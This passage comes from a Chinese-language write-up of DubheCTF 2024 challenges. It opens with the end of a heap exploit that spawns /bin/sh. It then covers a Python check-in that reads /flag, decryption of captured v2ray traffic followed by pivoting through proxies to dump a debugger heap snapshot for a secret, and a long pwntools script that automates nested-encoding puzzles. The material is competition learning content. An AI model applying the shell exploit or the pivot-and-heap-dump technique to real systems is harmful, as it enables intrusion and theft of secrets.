alloc(96, 0x37, p64(0)*3+p64(libcbase+2203784)+p64(libcbase+0x21b858)+p64(0)+p64(0x404408)*2+p64(0x404040)*1)
alloc(8, 0x38, p64(libcbase+0xebc88))
alloc(16, 0x39, b'/bin/sh\x00')

sh.interactive()
```

# 4. Misc

## 4.1 ezPythonCheckin

```
print(open('/flag').read())
```

![img](../images/2024-DubheCTF/20240319010444993.webp)

```
DubheCTF{l3HC7F_h45_4_8e77ER_Ch4lLEngE!}
```

## 4.2 authenticated mess & unauthenticated less

题目给了个流量包，里面有一个 pastebin 请求，里面写着 v2ray 配置，猜测是用来解后面几个 TCP 连接用的。

因为 v2ray 的题目也不是第一次出了，直接参考网上的文章调 v2ray-core 解密即可（有些涉及随机的部份要 hack(修改)一下 v2ray 源码，网上也有相关文章，就不具体说了）：

```Go
rawAccount := &vmess.Account {
    Id: "f3a5cae3-6bd2-40d1-b13b-2cc3d87af2c7",
}
account, _ := rawAccount.AsAccount()
vmessAccount := account.(*vmess.MemoryAccount)
user := protocol.MemoryUser {
    Account: vmessAccount,
}

req_reader, _ := os.Open("send.dat")
resp_reader, _ := os.Open("recv.dat")

clients := vmess.NewTimedUserValidator(protocol.DefaultIDHash)
clients.Add(&user)
server := encoding.NewServerSession(clients, encoding.NewSessionHistory())
header, _ := server.DecodeRequestHeader(req_reader)

bodyReader, _ := server.DecodeRequestBody(header, req_reader)
g, _ := os.Create("req.dat")
buf.Copy(bodyReader, buf.NewWriter(g))

hashkdf := hmac.New(sha256.New, []byte("VMessBF"))
hashkdf.Write(vmessAccount.ID.Bytes())
behaviorSeed := crc64.Checksum(hashkdf.Sum(nil), crc64.MakeTable(crc64.ISO))
client := encoding.NewClientSessionMonad(context.TODO(), true, protocol.DefaultIDHash, int64(behaviorSeed), server.GetRequestBodyKey(), server.GetRequestBodyIV(), 188)
client.DecodeResponseHeader(resp_reader)

respReader, _ := client.DecodeResponseBody(header, resp_reader)
g, _ = os.Create("resp.dat")
buf.Copy(respReader, buf.NewWriter(g))
```

然后解密发现了一个 HTTP 请求：

```Plain
GET /16/11c111ee40a928d5d751dd5869414093/__p0.png HTTP/1.1
Host: p.sda1.dev
User-Agent: curl/8.5.0
Accept: */*


HTTP/1.1 301 Moved Permanently
Date: Thu, 14 Mar 2024 17:01:14 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: max-age=3600
Expires: Thu, 14 Mar 2024 18:01:14 GMT
Location: https://p.sda1.dev/16/11c111ee40a928d5d751dd5869414093/__p0.png
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=sgApqBt7R%2BTPVzsJUP6dKzUIYvDlokg20zR5RKYg2S4tx8s%2BQhuA2wmj4tMXMToYVKabtM2RKHQqzWU1ZAi7MmfQSv1UzCjnF4q0j2HkIrW5hNeKpSy%2F7M2LpSsJ"}],"group":"cf-nel","max_age":604800}
NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
CF-RAY: 8645d3167e447c55-LAX
alt-svc: h3=":443"; ma=86400

0
```

访问一下可以得到一张图片，binwalk 后能发现一个加密的压缩包。然后图片本身拿去以图搜图，发现它的 P 站 id 是 116921220，所以密码就是 116921220。

解压，发现了一个 wrangler 项目，其中 docker-compose 里有 v2ray 和 edtunnel 两个容器；edtunnel 就是 wrangler 项目，它的配置表示 `env.FLAG` 就是 flag，不过要从运行中的实例去拿才行。通过搜索资料，不难发现 `wrangler dev` 会开启一个调试端口（inspectorPort），默认为 9229，不过只监听 localhost。

然后值得注意的是，上面 pastebin 给出的 v2ray 配置是能用的，连上去就进到了 v2ray 容器里面，可以访问 edtunnel:8787 的 wrangler 项目。然后接着发现，wrangler 项目里是实现了一个 VLESS 代理，并且配置也给出了，所以可以以 v2ray 为跳板，再连上 VLESS 代理，就可以进入到 edtunnel 容器中，自然也就可以访问它的 localhost:9229 inspect 端口了。

搭好这个隧道之后，就可以用 https://devtools.devprod.cloudflare.dev 连接这个 inspect 端口对 wrangler 项目进行调试。不过断点貌似不是很好下，不过可以在 Memory 里直接把整个 heap snapshot 导出，导出之后搜索一下 flag 就可以了。

![img](../images/2024-DubheCTF/20240319010444931.webp)

## 4.3 no more taowa

当帕鲁，被出题人玩弄。

需要完成25次在1分钟内解出临时flag，每次套娃的顺序都不一样，需要自动化识别和解决各种情况。

存在的情况有：Base32解码、Base64解码、Base85（IPv6码表）解码、Hex解码、从PNG每个像素提取四个字节、从PNG四个通道提取MSB或LSB得到二进制文件、从PNG alpha通道提取MSB或LSB得到二维码、从0/1字符串得到二维码、二维码解码、整个字节串顺序反转、逐字节的比特序反转、移除前导的四个或五个脏字节、五位数ZIP密码爆破。

这个自动化脚本除zip爆破外能自动完成（例如自动识别LSB、二维码、504B0304等），有存疑的地方会让人确认（例如base85前可能需要先[::-1]，脚本会给出两种情况的预览，然后人工判断，相当于CyberChef的魔术棒）。zip爆破部分会自动复制zip文件路径，然后人工将路径粘贴到ARCHPR，爆破完成后，人工将密码输入到程序中继续运行。

```Python
from pwn import *
import base64
from PIL import Image
from qreader import QReader
import cv2
import pyzipper
import pandas.io.clipboard as cb
import os
# import sys
import time
# import itertools
import string

print('import done')
context.log_level = 'debug'

SUBMITTED_ROUNDS = 0
# AUTOMODE = True
# ROLLBACK = None

def pretty_display(data: bytes):
    print(f'len: {len(data)}')
    if len(data) >= 128:
        print('first 64 bytes:')
        l = data[:64]
        print(l)
        for i in range(0, len(l), 16):
            print(' '.join([f'{l[i+j]:02x}' for j in range(16)]))
        print('last 64 bytes:')
        r = data[-64:]
        print(r)
        for i in range(0, len(r), 16):
            print(' '.join([f'{r[i+j]:02x}' for j in range(16)]))
    else:
        print(data)
        for i in range(0, len(data), 16):
            try:
                print(' '.join([f'{data[i+j]:02x}' for j in range(16)]))
            except:
                print(' '.join([f'{data[i+j]:02x}' for j in range(len(data)%16)]))

def ask_next(data: bytes):
    global s, SUBMITTED_ROUNDS
    pretty_display(data)
    print('''
1. b64 decode
2. b85 decode
3. b32 decode
4. hex decode
5. [::-1]
6. bits[::-1] foreach byte
7. lstrip <len>
8. rstrip b"\\x00"
9. clear junk bytes <to_remove> <to_add_0x40>
''')
# 10. reorder dword <order>
# 20. cartoon pic to data
# 21. brute zip pswd
# 22. pixel to data
# 99. get and send flag
    file_name = f'./tmp/{time.time()}.txt'
    print(f'save to {file_name}')
    with open(file_name, 'wb') as f:
        f.write(data)
    
    try:
        # auto bin
        if len(set(list(data))) == 2:
            if b'0' not in data:
                data = data.replace(b'\x8C', b'1').replace(b'\x0C', b'0')
            print('auto bin')
            ask_next(handle_res(data.decode(), f'./tmp/{time.time()}.qrtext.txt', 2))

        # auto remove unprintable
        printable_ratio = calculate_printable_ratio(data.rstrip(b'\x00')[4:])
        if printable_ratio > 0.95 and calculate_printable_ratio(data) != 1:
            if any(chr(data[_]) not in string.printable for _ in range(4)):
                print('auto remove unprintable: lstrip 4')
                new_data = data[4:]
                return ask_next(new_data)
            if data[-1] == 0:
                print('auto remove unprintable: rstrip b"\\x00"')
                new_data = data.rstrip(b'\x00')
                return ask_next(new_data)
            
        # auto base
        if data[-1] == b'=':
            try:
                new_data = auto_base(data.decode())
                return ask_next(new_data)
            except Exception as e:
                pass
        try:
            lbase = auto_base(data.decode())
        except:
            lbase = None
        try:
            rbase = auto_base(data.decode()[::-1])
        except:
            rbase = None
        if lbase is not None and rbase is not None:
            print('lbase will produce: ')
            if len(lbase) > 64:
                print(lbase[:64])
                print(lbase[-64:])
            else:
                print(lbase)
            print('rbase will produce: ')
            if len(rbase) > 64:
                print(rbase[:64])
                print(rbase[-64:])
            else:
                print(rbase)
        elif lbase is not None:
            return ask_next(lbase)
        elif rbase is not None:
            return ask_next(rbase)
        
        # auto lstrip 4
        if data[4:8] == b'\x89PNG' or data[4:6] == b'PK' or data[4:12] == b'504B0304' or data[4:12] == b'89504E47':
            print('auto lstrip 4')
            new_data = data[4:]
            return ask_next(new_data)

        # auto png and zip
        if data[:4] == b'\x89PNG':
            print('auto png')
            new_data = png_judge_type(file_name)
            return ask_next(new_data)
        if data[:2] == b'PK':
            print('auto zip')
            new_data = brute_zip_pswd(file_name)
            return ask_next(new_data)
        
        # auto hex
        if data[:8] == b'504B0304' or data[:8] == b'89504E47' \
            or data[:8] == b'04034B50' or data[:8] == b'474E5089' \
            or data[-8:] == b'504B0304' or data[-8:] == b'89504E47' \
            or data[-8:] == b'04034B50' or data[-8:] == b'474E5089':
            print('auto hex')
            new_data = int(data.decode(), 16).to_bytes(len(data)//2, 'big')
            # new_data = bytes([int(data.decode()[i:i+2], 16) for i in range(0, len(data), 2)])
            return ask_next(new_data)
        if data[:8] == b'4030B405' or data[:8] == b'74E40598' \
            or data[:8] == b'05B43040' or data[:8] == b'9805E474' \
            or data[-8:] == b'4030B405' or data[-8:] == b'74E40598' \
            or data[-8:] == b'05B43040' or data[-8:] == b'9805E474':
            data = data[::-1]
            print('auto rhex')
            new_data = int(data.decode(), 16).to_bytes(len(data)//2, 'big')
            # new_data = bytes([int(data.decode()[i:i+2], 16) for i in range(0, len(data), 2)])
            return ask_next(new_data)
        if len(set(list(data))) == 16:
            try:
                print('lhex will produce: ')
                if len(data) > 128:
                    print(int(data[:128].decode(), 16).to_bytes(64, 'big'))
                    print(int(data[-128:].decode(), 16).to_bytes(64, 'big'))
                else:
                    print(int(data.decode(), 16).to_bytes(len(data)//2, 'big'))
                print('rhex will produce: ')
                if len(data) > 128:
                    print(int(data[::-1][:128].decode(), 16).to_bytes(64, 'big'))
                    print(int(data[::-1][-128:].decode(), 16).to_bytes(64, 'big'))
                else:
                    print(int(data[::-1].decode(), 16).to_bytes(len(data)//2, 'big'))
            except:
                pass

        # auto [::-1]
        if data[-4:] == b'GNP\x89' or data[-2:] == b'KP' or b"i4Mu1S" in data \
            or data[-8:-4] == b'GNP\x89' or data[-6:-4] == b'KP' or b'FQY=)' in data:
                print('auto [::-1]')
                new_data = data[::-1]
                return ask_next(new_data)

        # auto bits[::-1] foreach byte
        if b'\x91\x0a\x72\xe2' in data[:10] or b'\xe2\x72\x0a\x91' in data[-10:] \
            or b'\x46\x4E\xAE\x2E\xA6\xFA\x0E\x36' in data \
            or b'\x36\x0e\xfa\xa6\x2e\xae\x4e\x46' in data:
                print('auto bits[::-1] foreach byte')
                new_data = bytes([int(bin(i)[2:].zfill(8)[::-1], 2) for i in list(data)])
                return ask_next(new_data)

        # auto submit flag
        if b'S1uM4i' in data:
            print('auto submit flag')
            try:
                s.sendline(regex_flag(data))
                SUBMITTED_ROUNDS += 1
                if SUBMITTED_ROUNDS != 25:
                    return get_chall()
                s.interactive()
            except Exception as e:
                print(e)
                print('failed to submit flag')
                pass

        cmd = input('>> ').strip().split()
        if cmd[0] == '1':
            new_data = base64.b64decode(data.decode())
            return ask_next(new_data)
        elif cmd[0] == '2':
            new_data = base64.b85decode(data.decode())
            return ask_next(new_data)
        elif cmd[0] == '3':
            new_data = base64.b32decode(data.decode())
            return ask_next(new_data)
        elif cmd[0] == '4':
            new_data = int(data.decode(), 16).to_bytes(len(data)//2, 'big')
            return ask_next(new_data)
        elif cmd[0] == '5':
            new_data = data[::-1]
            return ask_next(new_data)
        elif cmd[0] == '6':
            new_data = bytes([int(bin(i)[2:].zfill(8)[::-1], 2) for i in list(data)])
            return ask_next(new_data)
        elif cmd[0] == '7':
            new_data = data[int(cmd[1]):]
            return ask_next(new_data)
        elif cmd[0] == '8':
            new_data = data.rstrip(b'\x00')
            return ask_next(new_data)
        elif cmd[0] == '9':
            new_data = clear_junk_bytes(data, int(cmd[1], 16), int(cmd[2], 16))
            return ask_next(new_data)
        # elif cmd[0] == '10':
        #     new_data = reorder_dword(data, cmd[1])
        #     return ask_next(new_data)
        # elif cmd[0] == '20':
        #     new_data = cartoon_qr_to_data(file_name)
        #     return ask_next(new_data)
        # elif cmd[0] == '21':
        #     new_data = brute_zip_pswd(file_name)
        #     return ask_next(new_data)
        # elif cmd[0] == '22':
        #     new_data = pixel_to_data(file_name)
        #     return ask_next(new_data)
        # elif cmd[0] == '99':
        #     s.sendline(GetFlag(data))
        #     return get_chall()
        else:
            print('invalid command')
            return ask_next(data)
    except Exception as e:
        print(e)
        return ask_next(data)
        
def regex_flag(_data):
    import re
    t_flag = re.findall(b"S1uM4i.*}", _data)
    if len(t_flag) >= 0:
        return t_flag[0]
    else:
        raise Exception('not found')

def auto_base(data: str) -> bytes:
    if "S1uM4i" in data or "i4Mu1S" in data:
        raise Exception('is flag')
    check_base85_str = "!#$%&()*-;<>?@^_`{|}~"
    check_base64_str = "abcdefghijklmnopqrstuvwxyz"
    for _ in range(len(check_base85_str)):
        if check_base85_str[_] in data:
            print("auto decode base85")
            return base64.b85decode(data)
    for _ in range(len(check_base64_str)):
        if check_base64_str[_] in data:
            print("auto decode base64")
            return base64.b64decode(data)
    print("auto decode base32")
    return base64.b32decode(data)

def calculate_printable_ratio(data):
    printable_chars = string.printable
    total_chars = len(data)
    printable_chars_count = sum(1 for char in data if chr(char) in printable_chars)
    printable_ratio = printable_chars_count / total_chars
    return printable_ratio

def get_chall() -> str:
    global s
    s.recvuntil(b'-----BEGIN MATRYOSHKA MESSAGE-----\n')
    context.log_level = 'info'
    msg = s.recvuntil(b'-----END MATRYOSHKA MESSAGE-----\n')
    context.log_level = 'debug'
    msg = msg.decode().split()[:-3]
    msg = ''.join(msg)
    msg = base64.b64decode(msg)
    ask_next(msg)

def png_judge_type(file_name: str) -> bytes:
    img = Image.open(file_name)
    if img.width != 640 or img.height != 640:
        print('pixel')
        img.close()
        return pixel_to_data(file_name)
    # 用那个人的头判断是LSB还是MSB，遍历绿色第一行判断是2色还是4色
    if img.getpixel((270, 90))[0] >> 7 == 1:
        print('LSB')
        cnt = 0
        for x in range(640):
            if img.getpixel((x, 0))[1] & 1 == 1:
                cnt += 1
        img.close()
        if cnt > 100:
            print('4panel lsb')
            return cartoon_lsb_4(file_name)
        else:
            print('2panel lsb')
            return cartoon_lsb_2(file_name)
    else:
        print('MSB')
        cnt = 0
        for x in range(640):
            if img.getpixel((x, 0))[1] >> 7 == 1:
                cnt += 1
        img.close()
        if cnt > 100:
            print('4panel msb')
            return cartoon_msb_4(file_name)
        else:
            print('2panel msb')
            return cartoon_msb_2(file_name)

def cartoon_msb_2(file_name: str) -> bytes:
    img = Image.open(file_name)
    res = ''
    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = img.getpixel((x, y))
            if not b >> 7:
                res += str(a >> 7)
    img.close()
    return handle_res(res, file_name, 2)

def cartoon_lsb_2(file_name: str) -> bytes:
    img = Image.open(file_name)
    res = ''
    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = img.getpixel((x, y))
            if not b & 1:
                res += str(a & 1)
    img.close()
    return handle_res(res, file_name, 2)
def cartoon_lsb_4(file_name: str) -> bytes:
    img = Image.open(file_name)
    res = ''
    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = img.getpixel((x, y))
            res += str(r & 1)
            res += str(g & 1)
            res += str(b & 1)
            res += str(a & 1)
    img.close()
    return handle_res(res, file_name, 4)

def cartoon_msb_4(file_name: str) -> bytes:
    img = Image.open(file_name)
    res = ''
    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = img.getpixel((x, y))
            res += str(r >> 7)
            res += str(g >> 7)
            res += str(b >> 7)
            res += str(a >> 7)
    img.close()
    return handle_res(res, file_name, 4)

def handle_res(res: str, file_name: str, type: int) -> bytes:
    res_backup = res
    res = res.rstrip('0').rstrip('1')[20:].lstrip('1')
    # res = res.rstrip('0').rstrip('1').lstrip('0').lstrip('1')
    # print(res)
    if res[-7:] == '0000000' and res[:7] != '0000000':
        res = res[::-1]
    bits_per_row = 21
    while bits_per_row < 200 \
        and (res[bits_per_row*6 : bits_per_row*6+7] != '0000000' \
            or not all([res[bits_per_row * _] == '0' for _ in range(7)]) \
            or not -6 < len(res) // bits_per_row - bits_per_row < 6):
                bits_per_row += 1
    # if bits_per_row > 190:
    #     return handle_as_file(res_backup)
    # return handle_as_qr(res, bits_per_row, file_name)
    if type == 4:
        return handle_as_file(res_backup)
    return handle_as_qr(res, bits_per_row, file_name)
    
def handle_as_qr(res: str, bits_per_row: int, file_name: str) -> bytes:
    res += '1' * bits_per_row
    img = Image.new('1', (bits_per_row, len(res) // bits_per_row))
    for y in range(len(res) // bits_per_row):
        for x in range(bits_per_row):
            img.putpixel((x, y), (int(res[y * bits_per_row + x])))
    img.save(file_name + '.qr.png')
    qreader = QReader()
    image = cv2.cvtColor(cv2.imread(file_name + '.qr.png'), cv2.COLOR_BGR2RGB)
    decoded_text = qreader.detect_and_decode(image=image)
    decoded_text = decoded_text[0].encode()
    return decoded_text

def handle_as_file(res: str) -> bytes:
    res = res.rstrip('0')
    res += '0' * (8 - len(res) % 8)
    return int(res, 2).to_bytes(len(res) // 8, 'big') # + b'\x00' * 16

def reorder_dword(data: bytes, order: str) -> bytes:
    data = list(data)
    if len(data) % 4 != 0:
        data += [0] * (4 - len(data) % 4)
    for _ in range(0, len(data), 4):
        data[_], data[_+1], data[_+2], data[_+3] = data[_+int(order[0])-1], data[_+int(order[1])-1], data[_+int(order[2])-1], data[_+int(order[3])-1]
    return bytes(data)

def clear_junk_bytes(data: bytes, to_remove: int, to_add_0x40: int) -> bytes:
    data = data.replace(bytes([to_remove]), b'')
    data = list(data)
    i = 0
    while i < len(data):
        if data[i] == to_add_0x40:
            data[i+1] = data[i+1] + 0x40
            data[i:] = data[i+1:]
        i += 1
    print(data)
    print(max(data))
    return bytes(data)

def brute_zip_pswd(file_name: str) -> bytes:
    with open(file_name, 'ab') as f:
        f.write(b'\x00' * 16)
    abspth = os.path.abspath(file_name)
    print(abspth)
    cb.copy(abspth)
    pswd = input('password: ').strip().encode()
    zfile = pyzipper.AESZipFile(file_name, 'r')
    os.makedirs(file_name+'.ext', exist_ok=True)
    zfile.extractall(file_name+'.ext', pwd=pswd)
    zfile.close()
    files = os.listdir(file_name+'.ext')
    for f in files:
        fhnd = open(file_name+'.ext/'+f, 'rb')
        data = fhnd.read()
        fhnd.close()
        return data

# def old_brute_zip_pswd(file_name: str) -> bytes:
#     zfile = pyzipper.AESZipFile(file_name, 'r')
#     os.makedirs(file_name+'.ext', exist_ok=True)
#     # for pswd in [tuple(b'89045'), tuple(b'89046'), tuple(b'89047')]:
#     for pswd in list(itertools.product(b'0123456789', repeat=5)):
#         try:
#             if bytes(pswd).endswith(b'000'):
#                 print('trying password: ', bytes(pswd))
#             zfile.extractall(file_name+'.ext', pwd=bytes(pswd))
#             print('found password: ', bytes(pswd))
#             zfile.close()
#             files = os.listdir(file_name+'.ext')
#             for f in files:
#                 fhnd = open(file_name+'.ext/'+f, 'rb')
#                 data = fhnd.read()
#                 fhnd.close()
#                 return data
#         except Exception as e:
#             # print(e)
#             pass
#     raise Exception('no password found')

def pixel_to_data(file_name: str) -> bytes:
    img = Image.open(file_name)
    res = []
    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = img.getpixel((x, y))
            res += [r, g, b, a]
    return bytes(res).rstrip(b'\x00') + b'\x00'*16

if __name__ == '__main__':
    s = remote('1.95.11.7', 30721)
    s.recvuntil(b'flag\n')
    s.sendline(b'S1uM4i')
    get_chall()
    # test_files = os.listdir('lsb_msb_test')
    # for f in test_files:
    #     if f.endswith('.qr.png'):
    #         continue
    #     print(f)
    #     print(png_judge_type('./lsb_msb_test/' + f))
```

![img](../images/2024-DubheCTF/20240319010445007.webp)

```
DubheCTF{j00_H4V3_m4573r3d_m47Ry05HK4_d0Ll2!}
```